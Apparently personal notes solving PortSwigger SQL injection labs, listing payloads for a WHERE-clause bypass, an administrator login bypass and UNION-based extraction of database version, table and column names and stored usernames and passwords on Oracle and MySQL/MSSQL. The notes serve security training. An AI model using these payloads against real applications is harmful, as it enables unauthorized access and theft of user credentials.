# Basic SQL Injection

## **Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data**

### *To solve the lab, perform an SQL injection attack that causes the application to display details of all products in any category, both released and unreleased.*

`GET /filter?category=Lifestyle'+OR+1=1--`

## **Lab: SQL injection vulnerability allowing login bypass**

### *To solve the lab, perform an SQL injection attack that logs in to the application as the administrator user.*

`Username: Administrator'--`

[SQL Injection UNION Attacks](https://github.com/hackerbytrade/Hacker-Docs/blob/9e8136521216e9c29d478190488a42402b34d1ae/PortSwigger/SQL%20Injection/sql_union.md)


# Lab: SQL injection attack, querying the database type and version on Oracle

### This lab contains an SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.

- Determine Number of Columns using dual table (special built in table for Oracle)
`'+UNION+SELECT+NULL,NULL+FROM+dual--`

- Query to get version info via banner
`'+UNION+SELECT+BANNER,NULL+FROM+v$version--`

# Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft

### This lab contains an SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.

- Determine Number of Columns
`'+UNION+SELECT+NULL,NULL#`

- Query to get version info via banner
`'+UNION+SELECT+@@version,+NULL#`

# Lab: SQL injection attack, listing the database contents on non-Oracle databases
- Determine Number of Columns
`'+UNION+SELECT+NULL,NULL--`

- Retrieve List of Tables
`'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--`

- Select Specific Table
`'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_jkofuc'`

- Select Column Names
`'+UNION+SELECT+username_tyhqei,+password_jjgduf+FROM+users_jkofuc--`

# Lab: SQL injection attack, listing the database contents on Oracle

- Determine Number of Columns
`'+UNION+SELECT+NULL,NULL+FROM+DUAL--`

- Retrieve List of Tables
`'+UNION+SELECT+table_name,NULL+FROM+all_tables--`

- Retrieve Columns From Table
`'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_EURTJQ'--`

- Retrieve Data From Columns
`'+UNION+SELECT+USERNAME_UVKOLW,+PASSWORD_FQOUCN+FROM+USERS_EURTJQ--`


# Lab: Blind SQL injection with conditional responses